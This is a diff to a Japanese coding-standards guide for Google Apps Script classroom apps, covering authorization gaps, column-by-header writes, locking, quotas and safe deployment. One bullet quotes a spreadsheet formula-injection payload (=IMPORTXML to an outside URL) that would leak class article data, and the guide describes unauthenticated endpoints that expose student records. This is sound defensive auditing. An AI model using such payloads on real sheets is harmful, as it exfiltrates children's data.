@@ -317,15 +317,33 @@ grep -n '^function [a-zA-Z]' *.gs | grep -v '_(' | wc -l   # 公開エンドポ�
   - `physicaleducation_note/code.gs:394 saveLog(email,…)` は 22 関数すべてが公開・認可ゼロで、`getStudentDetailForTeacher` と `getAllLogsForCsv` も無認可（学級全員の氏名＋コメントを CSV で吸い出せる）。haiku-meeting は身元が localStorage の文字列だけで、voterId を変えながら 1 人で票を積めます。
 - **`openById` 失敗時に create して setProperty で ID を差し替える自己修復を、児童が通る経路に置かない。**
   - `physicaleducation_note/code.gs:23-35` の `getHealthySpreadsheet()` はまさにこの形で、しかも `executeAs: USER_ACCESSING` なので児童一人ひとりの権限で走ります。**名簿シートに権限のない転入生が 1 回開くだけで、学級全員の記録が入ったシートからその子の空シートへ差し替わります。** 画面にエラーは出ず「記録が消えた」ようにしか見えず、旧シートは誰の画面にも紐づきません。
-- **スプレッドシートと画像フォルダを `ANYONE_WITH_LINK + EDIT` で共有しない**（フォールバック先も含めて）。`online-publisher-pro/code.gs:164-192` は個人アカウントでもドメイン共有禁止時でも EDIT にフォールバックします。手本は `digital-newspaper/Code.gs:274-299`。
+- **スプレッドシートと画像フォルダを `ANYONE_WITH_LINK + EDIT` で共有しない**（フォールバック先も含めて）。`online-publisher-pro/code.gs:164-192` は個人アカウントでもドメイン共有禁止時でも EDIT にフォールバックします。手本は `digital-newspaper/Code.gs` の `applyPhotoSharing_`（2026-08-23 時点で :750-773）。
 - **役割やモードをクライアントの引数に決めさせない。** `online-publisher-pro/code.gs:316-318 getDraftList(mode, token)` は `mode !== 'teacher'` なら素通しで、else 枝が `teacherCmt` と `correction` を含めて返します。
-- **利用者の入力をセルに書く前に、先頭が `= + - @` タブなら `'` を足して無害化する**（CSV も同じ関数を通す）。持っているのは online-publisher-pro の `safeCellText_` と reflection_journal の `csvSafe_` だけ。`digital-newspaper/Code.gs:382-391` は素通し＝児童が題名に `=IMPORTXML("http://…"&A2)` と書くと、先生が開いた瞬間に学級の記事データが外部へ流れます。
+- **列を見出し名で読むと決めたなら、書くほうも見出し名で組む。** README に「列はヘッダー名で探すので、入れ替えても動きます」と書いてあっても、書き込みが `appendRow([a, b, c, …])` の位置決め打ちなら**その約束は守られていません**。先生が列を 1 本入れ替えた瞬間から、本文が記者名の列に入ります。画面には何も出ず、**印刷するまで誰も気づきません**（digital-newspaper で実際に起きていた。2026-08-23 の PR #9 で修正）。
+
+```bash
+# 横断：読みは名前・書きは位置、という食い違い
+grep -rn "appendRow(\[" $(git ls-files '*.gs') | grep -v "header\|HEADER"
+```
+
+- **見つからない列を「たぶん N 列目」で埋め合わせない。** `idx.tag = getIdx('Tag') !== -1 ? getIdx('Tag') : 7` という形。`Tag` の見出しが無く、8 列目に先生のメモ欄があるシートでは、**メモの中身がタグとして児童の記事一覧に並びます**。無いものは「無い」（空）として扱うほうが、点検で気づけます。
+
+```bash
+# 「見つからなければ N 列目」。三項演算子の右が数字リテラルなら、まず疑う
+grep -rnE "!== *-1 *\?.*: *[0-9]+" $(git ls-files '*.gs' '*.html')
+```
+
+- **シートの修整は「足す」と「書き方をそろえる」だけにする。消す・動かすは人がやる。** とくに、**見出しの行ごと消えている（＝1 行目がデータになっている）状態で見出しだけを書き戻してはいけません**。間違った列に正しいラベルが付き、そこから先は誰も間違いに気づけなくなります。手本は `haiku-meeting/code.gs:59-121`（点検のみ）と `digital-newspaper/Code.gs` の `checkSchema_` / `repairSchema_`（点検と、安全な範囲の修整を分けた形）。**コピー配布のアプリでは、先生が列をさわるのは想定外の事故ではなく、起こる操作として扱うこと。**
+
+- **利用者の入力をセルに書く前に、先頭が `= + - @` タブなら `'` を足して無害化する**（CSV も同じ関数を通す）。持っているのは online-publisher-pro の `safeCellText_` と reflection_journal の `csvSafe_` だけ。`digital-newspaper/Code.gs` の `saveArticle`（2026-08-23 時点で :849-896）は**いまも素通し**＝児童が題名に `=IMPORTXML("http://…"&A2)` と書くと、先生が開いた瞬間に学級の記事データが外部へ流れます（同日の PR #9 で書き込みを見出し名で組む形に直しましたが、無害化はまだ入っていません。**そこが次の 1 本です**）。
 
 ### 5-3. 排他制御とクォータ（40 台が一斉に叩く前提）
 
 - **教室で一斉に叩かれる更新（記録の追加・経験値の書き戻し・行の更新削除）は LockService で囲む。** 囲む範囲は `appendRow` / `setValues` の 1 回分に絞り、トークン検証やシート全読みはロックの外に出す。手本は `townmap_mikke/Db.gs:120-143`（`withScriptLock_` / `appendRowLocked_`）。
 - 実測: moral_note **0 件**、physicaleducation_note **0 件**、gamification **1 件**、townmap_mikke 3 件。
   - **壊れ方:** 40 人が一斉に送信する道徳の授業で同じ児童の Before が 2 行入り、散布図が二重点になって変容集計が壊れる。「すでに送信済み」も出ないので誰も気づかない。朝の会の同時ログインで経験値が互いに上書きされ、レベルが巻き戻る。
+- **ロックの中から、自分でロックを取る関数を呼ばない。** 手元では動くので気づけません（本番だけが待って落ちます）。偽の `LockService` に「握ったまま `waitLock` されたら例外」を入れておくと、テストで見つかります（手本: `digital-newspaper/tests/helpers/gas-sandbox.mjs`）。実例: `updateArticleTag` がロックを握ったまま、列を足すために自分でロックを取る `articleColumns_` を呼んでいた。
+- **画像・base64 の復号・ドライブへの書き込みをロックの中に入れない。** 1 件あたり数秒かかるので、40 人ぶんが直列になって合計が児童側の再送（たとえば 2+4+6 秒＝最長 22 秒）を追い越します。**全員が落ちるのではなく、後ろの数人だけが黙って落ちます。** 先生の画面には何も出ません。
 - **ポーリングを足す・間隔を縮めるときは「40 人 × 何 req/分」を PR 本文に書く。非表示タブでは必ず止める。同じリポジトリに複数のポーリングを作らない。**
   - `moral_note/js.html` には**ポーリングが 2 本**あります（`:52` は `if (!isPageVisible) return;` あり、`:1514` は**非表示ガード無し**）。40 人学級で常時 8 req/s 相当が GAS に当たります。
   - 唯一の手本が `townmap_mikke/README.md:359-360`（同時実行 約 30 / UrlFetch 日次 20,000 回、ID トークン検証は TTL 300 秒のキャッシュ前置）＋ `App.html:3992`（`if(document.hidden) return;`）。
@@ -335,11 +353,16 @@ grep -n '^function [a-zA-Z]' *.gs | grep -v '_(' | wc -l   # 公開エンドポ�
 
 - **`appsscript.json` を必ずリポジトリに置き、`webapp`（executeAs / access）と `oauthScopes` を明記したままにする。** **無いのは mirai-compass だけ**です（gamification は `manabi-quest/appsscript.json` に 30 行あります — リポジトリ直下に無いだけなので、重ねて作らないこと）。haiku-meeting は 6 行しかありません。
   - **壊れ方:** `clasp push` は GAS 側のマニフェストを丸ごと上書きするので、無いまま送るとウェブアプリの入口が消える（schoolplan_editor で実際に発生、コミット 07f0938）。`oauthScopes` が無いと GAS が保存のたびにスコープを推測し、DriveApp を 1 行足しただけで同意画面が広がって既存の承認が無効になり、授業中に全員が同意画面で止まる。
+- **コンテナバインドのコピーを配るアプリで `executeAs: USER_DEPLOYING`（＝「自分」実行）を選ぶときは、身元の判定を必ず `Session.getActiveUser()` だけで行う。** この形では `Session.getEffectiveUser()` は**誰が開いてもデプロイした先生**を返すので、認可に使った瞬間に学級全員が先生として通ります。`getEffectiveUser()` を使ってよいのは、メニュー（コンテナバインド文脈）からしか呼ばれない関数だけです。
+  - 利点は大きい: 児童が先生のスプレッドシートにもドライブにも**アクセス権を持たなくてよくなる**（＝児童がシートを直接開けない、`onOpen` を動かせない、初回にメニューを動かした人が管理者になる穴が構造的に塞がる）。
+  - 代わりに `Session.getActiveUser().getEmail()` は `access: DOMAIN` に限ってしか取れません。**`access` をドメイン外に開くと空文字になり、誰も管理画面に入れなくなります。** 変えたら本番で「先生のアカウントで管理画面が開けるか」を必ず 1 回確かめること（手元では確かめられません）。
+  - 実例: digital-newspaper（2026-08-23 の PR #9）。**この環境では GAS を実行できないため、本番での挙動は未確認のまま出しています。**
+- **GAS へ送るファイルの名前を変えたら、次の反映は「止まる」のが正しい。** `gas-deploy.mjs` の `deletions()` が「送るとGASから消えるファイルがあります」で停止します。1 回だけ `GAS_ALLOW_DELETIONS=1` を付けるか、GAS エディタで古いファイルを先に消す。**止まらないほうが危ない**（学校が使っている最中に消えると戻せない）。
 - **`oauthScopes` を広げない。** とくに `executeAs: USER_ACCESSING` で `auth/drive`（フルドライブ）を要求しない（online-publisher-pro と physicaleducation_note が該当）。保護者説明で「子どものドライブ全部を読めます」と言わざるを得なくなります。手本は `townmap_mikke/appsscript.json`（3 スコープ、`Main.gs:18-27` に DriveApp を使わない理由）と `schoolplan_editor`（drive.file に留めている）。
 - **デプロイのやり直しは「デプロイを管理 → 既存デプロイを編集」。「新しいデプロイ」を作らない**（`/exec` の URL が変わり、学級に配ったリンクが全部切れる）。
 - **2 本デプロイ（townmap_mikke / reflection_journal）では `--deploymentId` を外さない。** 崩すと児童用が USER_ACCESSING になり、`openClassSs_` が `CLASS_UNAVAILABLE` を返し続けて、授業中に学級全員の画面が同時に同じエラーになります。
 - **「main にマージした＝本番に反映された」と書かない・思わないこと。** シークレット未設定のリポジトリでは Deploy が全ステップ skipped で数秒で success を返します（Gamification run 32546338803 は 6 秒で success、全ステップ skipped。townmap_mikke・reflection_journal も同様）。**所要時間と各ステップの conclusion を見て確かめる。**
-- **package.json に `quality` / `ci` / `check` のいずれかを用意してから .gs を触る。** 正本 deploy.yml はこの 3 つを順に探し、どれも無ければ「飛ばします」と表示して緑のまま本番へ push します（該当: moral_note, townmap_mikke, physicaleducation_note, digital-newspaper, haiku-meeting。haiku-meeting は ci.yml では生成物一致も管理者認可テストも回しているのに、deploy 経由では全部飛びます）。
+- **package.json に `quality` / `ci` / `check` のいずれかを用意してから .gs を触る。** 正本 deploy.yml はこの 3 つを順に探し、どれも無ければ「飛ばします」と表示して緑のまま本番へ push します（該当: moral_note, townmap_mikke, physicaleducation_note, haiku-meeting。haiku-meeting は ci.yml では生成物一致も管理者認可テストも回しているのに、deploy 経由では全部飛びます。**digital-newspaper は 2026-08-23 の PR #9 で `check` / `test` / `ci` を用意して外れました**）。
 - **`.gitignore` に `.clasprc.json` と `.clasp.json` があることを確認してから clasp を使う**（linker-clipper と shared-folder-sync に無い）。`~/.clasprc.json` は Google アカウントの鍵そのもので、入った時点で児童の学習記録が入っている全 GAS プロジェクトが第三者に触れます。
 - **手元から本番へ直接配信するコマンド（`npm run deploy` の gh-pages 直押し、`gas:push` の単独実行）を使わない。** ゲートを通らず、ローカルが古ければ他人の変更を巻き戻した状態を本番に押し出します。gh-pages は PR 履歴に残りません。
 - .gs のテストは **`standards/gas/Gemini.test.mjs` と同じ形**（`vm.createContext` で SpreadsheetApp / PropertiesService / LockService / Session / Utilities を偽物に差し替え、ソースをそのまま実行）で書く。**関数を正規表現で切り出す方式は避ける**（`gamification/tools/check-exp.js:25` は書き方を少し変えただけで「読み取れませんでした」と落ちます）。手本: `schoolplan_editor/tests/helpers/webapp-sandbox.mjs`（366 テスト）。
